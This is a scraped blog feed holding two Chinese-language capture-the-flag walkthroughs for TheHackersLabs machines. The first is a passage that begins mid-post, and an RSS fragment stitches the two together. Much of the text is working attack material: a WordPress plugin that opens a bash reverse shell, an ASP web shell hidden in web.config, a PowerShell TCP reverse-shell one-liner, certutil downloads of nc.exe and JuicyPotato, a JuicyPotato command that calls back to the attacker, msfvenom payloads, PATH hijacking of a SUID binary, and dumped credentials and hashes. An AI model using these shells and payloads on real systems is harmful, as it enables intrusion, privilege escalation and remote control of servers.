File Name                       : wp-login.jpg
Directory                       : .
File Size                       : 648 kB
File Modification Date/Time     : 2024:12:25 04:24:46+08:00
File Access Date/Time           : 2025:01:01 13:34:42+08:00
File Inode Change Date/Time     : 2025:01:01 13:34:42+08:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 3840
Image Height                    : 2160
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 3840x2160
Megapixels                      : 8.3
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ stegseek wp-login.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: 'bestfriend'
[i] Original filename: 'wp-login.txt'.
[i] Extracting to 'wp-login.jpg.out'.

                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ cat wp-login.jpg.out
uFQ07kmjImx$)x9HHH3J3Sa5
                    
```

登上去了，提权就简单了，传个Plugins Shell上去

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat wp_reverse.php 
&lt;?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec('/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'');
?&gt;
                         
```

压成压缩包当插件传上去就好了。

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                         
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.220] 57678
bash: cannot set terminal process group (798): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheHackersLabs-Offensive:/var/www/wordpress/wp-admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

---

## 3. 获得稳定的 Shell

获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

---

## 4.提权

```bash
www-data@TheHackersLabs-Offensive:/tmp$ ss -ntlup
Netid                State                 Recv-Q                 Send-Q                                 Local Address:Port                                 Peer Address:Port                Process                                    
udp                  UNCONN                0                      0                                            0.0.0.0:68                                        0.0.0.0:*                                                              
tcp                  LISTEN                0                      4096                                         0.0.0.0:5000                                      0.0.0.0:*                                                              
tcp                  LISTEN                0                      511                                          0.0.0.0:8080                                      0.0.0.0:*                    users:(('node',pid=561,fd=18))            
tcp                  LISTEN                0                      128                                          0.0.0.0:22                                        0.0.0.0:*                                                              
tcp                  LISTEN                0                      80                                         127.0.0.1:3306                                      0.0.0.0:*                                                              
tcp                  LISTEN                0                      128                                             [::]:22                                           [::]:*                                                              
tcp                  LISTEN                0                      511                                                *:80                                              *:*                                                              

```

开了个3306,看看有什么，这可以查到他的mysql密码

```bash
www-data@TheHackersLabs-Offensive:/tmp$ cat /var/www/wordpress/wp-config.php 
&lt;?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to 'wp-config.php'
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wp_user' );

/** Database password */
define( 'DB_PASSWORD', 'wpManoloPass' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 *
 * At the installation time, database tables are created with the specified prefix.
 * Changing this value after WordPress is installed will make your site think
 * it has not been installed.
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/#table-prefix
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the 'stop editing' line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

查看mysql有没有敏感信息

```bash
MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
5 rows in set (0.001 sec)

MariaDB [(none)]&gt; use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mysql]&gt; show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| column_stats              |
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| global_priv               |
| gtid_slave_pos            |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| index_stats               |
| innodb_index_stats        |
| innodb_table_stats        |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| roles_mapping             |
| servers                   |
| slow_log                  |
| table_stats               |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| transaction_registry      |
| user                      |
+---------------------------+

MariaDB [mysql]&gt; SELECT user, host, authentication_string FROM mysql.user;
+-------------+-----------+-------------------------------------------+
| User        | Host      | authentication_string                     |
+-------------+-----------+-------------------------------------------+
| mariadb.sys | localhost |                                           |
| root        | localhost | invalid                                   |
| mysql       | localhost | invalid                                   |
| wp_user     | localhost | *41D869A459C5FC17FE6786D4B639FE7FE528DCC2 |
+-------------+-----------+-------------------------------------------+
4 rows in set (0.001 sec)

MariaDB [wordpress]&gt; show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.000 sec)

MariaDB [wordpress]&gt; SELECT user_login, user_pass FROM wp_users;
+---------------+------------------------------------+
| user_login    | user_pass                          |
+---------------+------------------------------------+
| administrator | $P$BPzDdGMVlbK3gPYUUVtbvf0roz4rxX/ |
+---------------+------------------------------------+
1 row in set (0.000 sec)


```

下班，什么都没有。实在找不到甩了一个linpeas.sh过来,没有什么有价值的东西，但是我在看linpeas报告的时候再看了一边开放的端口发现5000端口是开放的，而且我nmap探测没探测出来，应该玄机就在这里，先转发出去先

```bash
www-data@TheHackersLabs-Offensive:/tmp$ socat TCP-LISTEN:1234,fork TCP4:127.0.0.1:5000 &amp;
[1] 20694

```

![image](https://github.com/user-attachments/assets/df8f29f1-fe16-41a2-9bc6-66542f3465bb)

爆破PIN,也就10000种可能（如果你是通过代理的形式转发端口如:`chisel`这种，我建议你直接抄我的PIN，因为代理巨慢，不要问为什么我知道，因为我一开始就是这样干的）

![image](https://github.com/user-attachments/assets/822a8467-e878-4a48-84a9-9f1c8fa38d1c)

PIN为3333的时候长度明显不一样，所以就是3333。

![image](https://github.com/user-attachments/assets/d46a4cc8-8700-4796-baa2-336f1cda0846)

可以执行命令，弹个shell回来。

```bash
maria@TheHackersLabs-Offensive:~$ id
uid=1001(maria) gid=1001(maria) grupos=1001(maria)

```

尝试提权。

```bash
maria@TheHackersLabs-Offensive:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-Offensive: Nombre o servicio desconocido
[sudo] contraseña para maria: 
sudo: a password is required
maria@TheHackersLabs-Offensive:~$ ls -la
total 132
drwx------ 3 maria maria  4096 dic 31 05:35 .
drwxr-xr-x 3 root  root   4096 dic 29 15:41 ..
-rwsr-xr-x 1 root  root  16056 dic 26 10:22 app
-rw-r--r-- 1 maria maria    67 dic 26 11:20 backup.txt
-rw------- 1 maria maria    29 dic 29 15:41 .bash_history
-rw-r--r-- 1 maria maria   220 mar 29  2024 .bash_logout
-rw-r--r-- 1 maria maria  3526 mar 29  2024 .bashrc
-rw-r--r-- 1 maria maria 55646 dic  9  2021 GyMG.jpg
-rw-r--r-- 1 maria maria  4629 dic 27 10:14 index.php
-rw------- 1 maria maria    20 dic 26 11:59 .lesshst
drwxr-xr-x 3 maria maria  4096 dic 25 06:02 .local
-rw-r--r-- 1 maria maria   257 dic 25 18:46 logout.php
-rw-r--r-- 1 maria maria   807 mar 29  2024 .profile
-rw-r--r-- 1 maria maria    29 dic 31 05:35 user.txt
-rw-r--r-- 1 maria maria  4721 dic 27 07:47 welcome.php

```

这个app有点意思。

```bash
maria@TheHackersLabs-Offensive:~$ strings app 
/lib64/ld-linux-x86-64.so.2
puts
setuid
system
__libc_start_main
__cxa_finalize
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
[*] Mostrando las primeras 8 l
neas del archivo /etc/shadow 
/usr/bin/head -n 8 /etc/shadow
head -n 8 /etc/shadow
;*3$'
GCC: (Debian 12.2.0-14) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
app.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
_fini
system@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment

```

像是执行了`head -n 8 /etc/shadow`，我们托去IDA一探真容。

![image](https://github.com/user-attachments/assets/b2985cc2-ac93-42bb-8b22-08668879ff48)

猜的没错，我们命令注入一下。

```bash
maria@TheHackersLabs-Offensive:~$ echo 'chmod u+s /bin/bash' &gt; head
maria@TheHackersLabs-Offensive:~$ chmod +x head 
maria@TheHackersLabs-Offensive:~$ export PATH=/home/maria:$PATH
maria@TheHackersLabs-Offensive:~$ which head 
/home/maria/head
maria@TheHackersLabs-Offensive:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 mar 29  2024 /bin/bash
maria@TheHackersLabs-Offensive:~$ ./app


[*] Mostrando las primeras 8 líneas del archivo /etc/shadow 

root:$y$j9T$2mXNTjVfEEjRt6t2uVu7k0$RBnftcaGot4JsJ8DHVuo0LkG8UuuKR68CdazrjK2Rf8:20088:0:99999:7:::
daemon:*:20066:0:99999:7:::
bin:*:20066:0:99999:7:::
sys:*:20066:0:99999:7:::
sync:*:20066:0:99999:7:::
games:*:20066:0:99999:7:::
man:*:20066:0:99999:7:::
lp:*:20066:0:99999:7:::


[*] Mostrando las primeras 8 líneas del archivo /etc/shadow 

maria@TheHackersLabs-Offensive:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 mar 29  2024 /bin/bash
maria@TheHackersLabs-Offensive:~$ bash -p
bash-5.2# id
uid=1001(maria) gid=1001(maria) euid=0(root) grupos=1001(maria)

```

---

## 5.总结

去瞄了`ll104567`大佬的wp，发现WordPress那里可以使用**wpscan**扫描全部插件

```bash
wpscan --url http://192.168.205.213 -e ap,u --plugins-detection aggressive --api-token xxx
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_Offensive.html</guid><pubDate>Fri, 27 Jun 2025 09:33:56 +0000</pubDate></item><item><title>thl_ensala-papas</title><link>https://7r1UMPHK.github.io/post/thl_ensala-papas.html</link><description># thl_ensala-papas

# 0.简介

**靶机**：[thehackerslabs - ensala-papas](https://thehackerslabs.com/ensala-papas/)
**难度**：初学者
**目标 IP**：192.168.205.221
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap`起手，先探测端口

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:17 CST
Nmap scan report for 192.168.205.221
Host is up (0.00068s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
3167/tcp  filtered nowcontact
47001/tcp open     winrm
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49156/tcp open     unknown
49157/tcp open     unknown
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 11.77 seconds
                                                                   
```

再探测详细服务

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:19 CST
Nmap scan report for 192.168.205.221
Host is up (0.00046s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.00 seconds
                                                                
```

探测UDP服务

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sU -n -T4 --top-ports 100 192.168.205.221 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:27 CST
Nmap scan report for 192.168.205.221
Host is up (0.00048s latency).
Not shown: 62 closed udp ports (port-unreach), 37 open|filtered udp ports (no-response)
PORT    STATE SERVICE
137/udp open  netbios-ns
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 69.21 seconds
```

使用`nmap`扫描漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap --script=vuln -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:24 CST
Nmap scan report for 192.168.205.221
Host is up (0.00056s latency).

PORT      STATE SERVICE
80/tcp    open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 148.15 seconds
                                              
```

目前为止，感兴趣的端口有 **80**、**445，**  windwos的靶机445的优先级高于80，所以我们先测试445端口有没有利用点

---

# 2.踩点

## 2.1 port 445

```bash
┌──(kali㉿kali)-[~/test]
└─$ netexec smb 192.168.205.221 -u guest -p '' --shares
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)                                                                                                            
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [-] WIN-4QU3QNHNK7E\guest: STATUS_LOGON_FAILURE 
                                                                                                    
```

它没有开放访客登录，所以可以直接去观察80端口了

## 2.2 port 80

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.221 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x aspx,asp,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.221
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,html,txt,md,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/*checkout*.aspx      (Status: 400) [Size: 20]
/zoc.aspx             (Status: 200) [Size: 1159]
/*docroot*.aspx       (Status: 400) [Size: 20]
/*.aspx               (Status: 400) [Size: 20]
/http%3A%2F%2Fwww.aspx (Status: 400) [Size: 20]
/**http%3a.aspx       (Status: 400) [Size: 20]
/q%26a.aspx           (Status: 400) [Size: 20]
/http%3A.aspx         (Status: 400) [Size: 20]
/*http%3A.aspx        (Status: 400) [Size: 20]
/http%3A%2F%2Fyoutube.aspx (Status: 400) [Size: 20]
/http%3A%2F%2Fblogs.aspx (Status: 400) [Size: 20]
Progress: 345575 / 7642998 (4.52%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 345933 / 7642998 (4.53%)
===============================================================
Finished
===============================================================

```

扫到一个`/zoc.aspx`，去浏览器查看了一下，是一个上传页，并在注释发现了一个目录路径`/Subiditosdetono/`，当我们把目录加入网址会看到如下内容

![image](https://github.com/user-attachments/assets/b3e461b5-23c7-4dfc-b908-ba7fea785815)

我们可以看到有一个`config`文件，当我们点击时会发现**404**无法访问，那我们还是回上传页试试能不能上传**shell**

![image](https://github.com/user-attachments/assets/bd39753c-d756-4346-b2a8-d921cc8ecfd2)

不允许我们上传`.aspx`后缀的文件，根据之前访问`/Subiditosdetono/`看到有`config`文件，我们可以从中知道，可以上传`config`文件，我们去[hacktricks](https://book.hacktricks.xyz/)搜索一下看`config`文件可不可以做`shell`

![image](https://github.com/user-attachments/assets/3d2656b4-ae69-493a-b8f7-8e99ea490bdd)

找到了一点有意思的东西，我们把它的示例[复制](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)下来，上传运行

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat web.config 
&lt;?xml version='1.0' encoding='UTF-8'?&gt;
&lt;configuration&gt;
   &lt;system.webServer&gt;
      &lt;handlers accessPolicy='Read, Script, Write'&gt;
         &lt;add name='web_config' path='*.config' verb='*' modules='IsapiModule' scriptProcessor='%windir%\system32\inetsrv\asp.dll' resourceType='Unspecified' requireAccess='Write' preCondition='bitness64' /&gt;       
      &lt;/handlers&gt;
      &lt;security&gt;
         &lt;requestFiltering&gt;
            &lt;fileExtensions&gt;
               &lt;remove fileExtension='.config' /&gt;
            &lt;/fileExtensions&gt;
            &lt;hiddenSegments&gt;
               &lt;remove segment='web.config' /&gt;
            &lt;/hiddenSegments&gt;
         &lt;/requestFiltering&gt;
      &lt;/security&gt;
   &lt;/system.webServer&gt;
&lt;/configuration&gt;
&lt;!--
&lt;% Response.write('-'&amp;'-&gt;')%&gt;
&lt;%
Set oScript = Server.CreateObject('WSCRIPT.SHELL')
Set oScriptNet = Server.CreateObject('WSCRIPT.NETWORK')
Set oFileSys = Server.CreateObject('Scripting.FileSystemObject')

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject('WScript.Shell')
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%&gt;

&lt;BODY&gt;
&lt;FORM action='' method='GET'&gt;
&lt;input type='text' name='cmd' size=45 value='&lt;%= szCMD %&gt;'&gt;
&lt;input type='submit' value='Run'&gt;
&lt;/FORM&gt;

&lt;PRE&gt;
&lt;%= '\\' &amp; oScriptNet.ComputerName &amp; '\' &amp; oScriptNet.UserName %&gt;
&lt;%Response.Write(Request.ServerVariables('server_name'))%&gt;
&lt;p&gt;
&lt;b&gt;The server's port:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables('server_port'))%&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;b&gt;The server's software:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables('server_software'))%&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;b&gt;The server's software:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables('LOCAL_ADDR'))%&gt;
&lt;% szCMD = request('cmd')
thisDir = getCommandOutput('cmd /c' &amp; szCMD)
Response.Write(thisDir)%&gt;
&lt;/p&gt;
&lt;br&gt;
&lt;/BODY&gt;



&lt;%Response.write('&lt;!-'&amp;'-') %&gt;
--&gt;
        
```

![image](https://github.com/user-attachments/assets/2ab0ece6-4187-4cc6-93dd-610a3eb4cfdc)

弹个**shell**回来

```bash
powershell -nop -c '$client = New-Object System.Net.Sockets.TCPClient('192.168.205.141',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

#攻击机
┌──(kali㉿kali)-[~/test/netcat]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.221] 49159
whoami
win-4qu3qnhnk7e\info
```

---

# 3.提权

拿到**shell**后看看权限

```bash
PS C:\users\info&gt; whoami /priv

INFORMACI?N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci?n                                  Estado     
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci?n de recorrido             Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado

```

我们有 `SeImpersonatePrivilege`权限，所以我们可以使用 **[JuicyPotato](https://github.com/ohpe/juicy-potato)** 工具来提升权限。

![image](https://github.com/user-attachments/assets/18a9bc24-472b-4771-bf45-70707157ece7)

```bash
PS C:\tmp&gt; certutil.exe -urlcache -split -f http://192.168.205.141:8000/nc.exe nc.exe
****  En l?nea  ****
  0000  ...
  e800
CertUtil: -URLCache comando completado correctamente.
PS C:\tmp&gt; dir


    Directorio: C:\tmp


Mode                LastWriteTime     Length Name                            
----                -------------     ------ ----                            
-a---        02/01/2025     15:19      59392 nc.exe                          


PS C:\tmp&gt; certutil.exe -urlcache -split -f http://192.168.205.141:8000/JuicyPotato.exe JuicyPotato.exe
****  En l?nea  ****
  000000  ...
  054e00
CertUtil: -URLCache comando completado correctamente.
PS C:\tmp&gt; dir


    Directorio: C:\tmp


Mode                LastWriteTime     Length Name                            
----                -------------     ------ ----                            
-a---        02/01/2025     15:22     347648 JuicyPotato.exe                 
-a---        02/01/2025     15:19      59392 nc.exe                          



```

先将`JuicyPotato.exe`和`nc.exe`传上目标机器

```bash
./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a '/c C:\tmp\nc.exe -e cmd 192.168.205.141 4567' -c '{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}'
```

运行`JuicyPotato.exe`

```bash
└─$ nc -lvnp 4567    
listening on [any] 4567 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.221] 49176
Microsoft Windows [Versi�n 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.
C:\Windows\system32&gt;whoami
whoami
nt authority\system

```

成功拿到**system**权限

---

# 4.总结

在`BerserkWings`、`ll104567`大佬那学了点技术[笑脸]

## 4.1 分析 SMB 服务

**检查域**、**操作系统版本**、**是否可以访客登录**等

```bash
┌──(kali㉿kali)-[~/test]
└─$ crackmapexec smb 192.168.205.221
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ netexec smb 192.168.205.221                    
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)                                                                                                          
                          
```

列出与 **smblcient** 共享的文件

```bash
┌──(kali㉿kali)-[~/test]
└─$ smbclient -L //192.168.205.221// -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.205.221 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available                                                         
```

自动化脚本

```bash
┌──(kali㉿kali)-[~/test]
└─$ smbmap -H 192.168.205.221        

    ________  ___      ___  _______   ___      ___       __         _______
   /'       )|'  \    /'  ||   _  '\ |'  \    /'  |     /''\       |   __ '\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /' \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                        
[!] Access denied on 192.168.205.221, no fun for you...                                                                
[*] Closed 1 connections                                                                                                   
                                  
```

## 4.2 windows常用命令

```bash
# 查看操作系统 （OS） 信息
systeminfo
# 查看拥有权限
whoami /priv
# 下载攻击机文件
copy \\192.168.205.141\nc.exe .
```

## 4.3 msf

生成**shell**

```bash
┌──(kali㉿kali)-[~/test]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.205.141 LPORT=4444 f exe -o msf.exe 

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Saved as: msf.exe

```

连接**shell**

```bash
msf6 &gt; use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
```

自动化漏洞挖掘（要有msf的shell）

